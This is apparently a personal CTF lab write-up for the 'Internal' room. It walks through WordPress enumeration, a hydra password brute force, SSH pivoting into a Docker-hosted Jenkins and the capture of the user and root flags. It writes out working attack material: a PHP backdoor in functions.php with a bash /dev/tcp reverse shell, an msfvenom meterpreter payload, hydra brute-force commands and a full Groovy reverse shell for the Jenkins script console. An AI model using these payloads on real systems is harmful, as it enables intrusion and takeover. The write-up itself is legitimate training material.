# Internal
## **Scope of Work**
The client requests that an engineer conducts an external, web app, and internal assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:
- User.txt
- Root.txt  

Additionally, the client has provided the following scope allowances:
- Ensure that you **modify your hosts file to reflect internal.thm**
- Any tools or techniques are permitted in this engagement
- Locate and note all vulnerabilities found
- Submit the flags discovered to the dashboard
- Only the IP address assigned to your machine is in scope

- First, i scan for open services and versions using `nmap -sV -sC 10.10.56.148`

![Pasted image 20251008143647.png](thm_pics/Pasted%20image%2020251008143647.png)

- lets try accessing the website

![Pasted image 20251008144109.png](thm_pics/Pasted%20image%2020251008144109.png)

- message says "You should **replace this file** (located at /var/www/html/index.html) before continuing to operate your HTTP server", i will keep that in mind

![Pasted image 20251008144241.png](thm_pics/Pasted%20image%2020251008144241.png)

- many of them seem interesting actually
- First, i will add internal.thm to /etc/hosts file first so it will reflect internal.thm host
- here is how "blog" looks like

![Pasted image 20251008144843.png](thm_pics/Pasted%20image%2020251008144843.png)

- heres how phpmyadmin dir looks like

![Pasted image 20251008145005.png](thm_pics/Pasted%20image%2020251008145005.png)

- javascript and wordpress dir are inaccessible for now
- since i know its wordpress, lets use wpscan to scan this server to enumerate more information
- command : `wpscan --url http://10.10.56.148/blog`/
- enumerate usernames : `wpscan --url http://10.10.56.148/blog/ -e u`
- but seems like it didnt work?
- So i tried **wordpress_scanner** in msfconsole instead

![Pasted image 20251008150312.png](thm_pics/Pasted%20image%2020251008150312.png)

- found **wordpress 5.4.2**
- it couldnt find any users tho

![Pasted image 20251008151206.png](thm_pics/Pasted%20image%2020251008151206.png)

- i dont think they are related
- anyway i decided to keep finding users in the blog dir and found comment by **"admin"**

![Pasted image 20251008153414.png](thm_pics/Pasted%20image%2020251008153414.png)

- then, i will try using **hydra** to brute force to wordpress login
- Directory : http://internal.thm/blog/wp-login.php
- Command : `hydra -l admin -P /usr/share/wordlists/rockyou.txt internal.thm http-form-post "/blog/wp-login.php:log=^USER^&pwd=^PASS^:Error"`

![Pasted image 20251008154521.png](thm_pics/Pasted%20image%2020251008154521.png)

- found it!!

![Pasted image 20251008154706.png](thm_pics/Pasted%20image%2020251008154706.png)

- theres another user called willam, lets keep this in mind
- now, i wanna perform gobuster in admin's site
- Command : `gobuster dir -u http://10.10.56.148/blog/wp-admin/ -w /usr/share/wordlists/dirb/common.txt -U admin -P 'my2boys'` 

![Pasted image 20251008155506.png](thm_pics/Pasted%20image%2020251008155506.png)

- seems like i cannot access these files even as admin, maybe they belong to root
### Exploitation phase
How to get a shell? 
- create a reverse tcp shell using msfvenom : `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.23.125.244 LPORT=4444 -f elf > meterpreter_payload.elf`
In wordpress,
- 1st way : Plugin / Theme upload : In WP admin: **Plugins → Add New → Upload Plugin*- (theres no options to upload plugin)
- 2nd way : Theme editor
	- **Appearance → Theme Editor**:
	- select "functions.php" at the right bar

![Pasted image 20251008161222.png](thm_pics/Pasted%20image%2020251008161222.png)

- Edit `functions.php` of the active theme (or create a small template file) and append a reverse shell payload
`// add to bottom of functions.php (lab only)`
`if (isset($_GET['pwn'])) {`
  `system("bash -c 'bash -i >& /dev/tcp/10.23.125.244/4444 0>&1'");`
`}`
- Save, trigger by visiting `curl -v -L 'http://10.10.56.148/blog/?pwn=1'`
- because blog dir executes the theme, so the command we just inserted will work
- but first, set up listener, this time i will use msfconsole multi handler
- Payload used : **cmd/unix/reverse_bash**

![Pasted image 20251008162758.png](thm_pics/Pasted%20image%2020251008162758.png)

## finding user.txt
- now, lets try to find user.txt flag first
- command : `find / -name "user.txt"`

![Pasted image 20251008162955.png](thm_pics/Pasted%20image%2020251008162955.png)

![Pasted image 20251008163118.png](thm_pics/Pasted%20image%2020251008163118.png)

- i dont think this is it

![Pasted image 20251008163142.png](thm_pics/Pasted%20image%2020251008163142.png)

- there must be a user called **aubreanna**, **we should try to find her creds** (otherwise, we brute force)

![Pasted image 20251008170424.png](thm_pics/Pasted%20image%2020251008170424.png)

- what is swap.img?
- i will transfer that pic to my attacker machine by hosting a simple python http server and wget
- Seems like i cannot do that due to **low permissions!**
- Keep finding hints via root
- remember we found phpmyadmin directory at first? maybe we should look at the dir that stores phpmyadmin info
- Command : `find / -name "phpmyadmin"`

![Pasted image 20251008172253.png](thm_pics/Pasted%20image%2020251008172253.png)

![Pasted image 20251008172209.png](thm_pics/Pasted%20image%2020251008172209.png)

- there are 2 files that has www-data as a group, so we can read these
- i tried : **config-db.php**

![Pasted image 20251008172544.png](thm_pics/Pasted%20image%2020251008172544.png)

- maybe that is the pass for phpmyadmin?
- lets try accessing it in http://internal.thm/phpmyadmin/

![Pasted image 20251008172820.png](thm_pics/Pasted%20image%2020251008172820.png)

- i now **have access to the database**, but the username and usergroup columns are null, so its not useful
- Next, i found an interesting file in /opt, and can be read by anyone

![Pasted image 20251008174213.png](thm_pics/Pasted%20image%2020251008174213.png)

![Pasted image 20251008174146.png](thm_pics/Pasted%20image%2020251008174146.png)

- i found aubrenna's creds, lets try logging in via ssh as aubreanna
- and i got user.txt flag
### gaining root access

![Pasted image 20251008173451.png](thm_pics/Pasted%20image%2020251008173451.png)

- theres another interface called docker, maybe we can use netstat -tunlp to see what ports on the server are currently listening to outside connections
- Command : `netstat -tunlp`

![Pasted image 20251008173952.png](thm_pics/Pasted%20image%2020251008173952.png)

- and when i cat jenkins.txt, this is the message

![Pasted image 20251008174537.png](thm_pics/Pasted%20image%2020251008174537.png)

- i knew theres another interface!
## Pivoting
- since we cannot reach 172.17.0.2 by ourselves, we have to create a tunnel using ssh so that we can access 172.17.0.2:8080 **via port 8080 OF our attacking machine** (PORT FORWARDING)
- Command : `ssh -L 22:172.17.0.2:8080 aubreanna@10.10.56.148`
- Then i access : localhost:8080 in our browser
- got it!

![Pasted image 20251008175834.png](thm_pics/Pasted%20image%2020251008175834.png)

- now, we can enumerate it

![Pasted image 20251008175931.png](thm_pics/Pasted%20image%2020251008175931.png)

- ahh classic robots.txt, that means its a webserver

![Pasted image 20251008180035.png](thm_pics/Pasted%20image%2020251008180035.png)

![Pasted image 20251008180143.png](thm_pics/Pasted%20image%2020251008180143.png)

- we can try this exploit
- set RHOSTs to 127.0.0.1 and RPORT 8080

![Pasted image 20251008180245.png](thm_pics/Pasted%20image%2020251008180245.png)

- not exploitable
- maybe we can just **use hydra to brute force for admin user**
- Command : `hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 127.0.0.1 http-form-post "/j_acegi_security_check:j_username=admin&j_password=^PASS^:Invalid"`

![Pasted image 20251008180806.png](thm_pics/Pasted%20image%2020251008180806.png)

- Then we can attack jenkins by using Script console

![Pasted image 20251008181002.png](thm_pics/Pasted%20image%2020251008181002.png)

- then i found groovy script, which uses reverse shell to connect back to our target with port 3456, but we must set up a listener first

`String host="10.23.125.244";`  
`int port=3456; String cmd="/bin/bash";`  
`Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`

![Pasted image 20251008181345.png](thm_pics/Pasted%20image%2020251008181345.png)

- got access to jenkins
- find anything with .txt at the end : `find / -type f -name "*.txt" 2>/dev/null`

![Pasted image 20251008191215.png](thm_pics/Pasted%20image%2020251008191215.png)

- read /opt/note.txt, that seems sus

![Pasted image 20251008191555.png](thm_pics/Pasted%20image%2020251008191555.png)

- access root account via ssh in previous port (aubreanna must be an admin for jenkins, since she can read jenkins.txt file in her directory and thus, can access jenkins admin)
- Command : `ssh root@10.10.56.148`
- now, i have the root flag!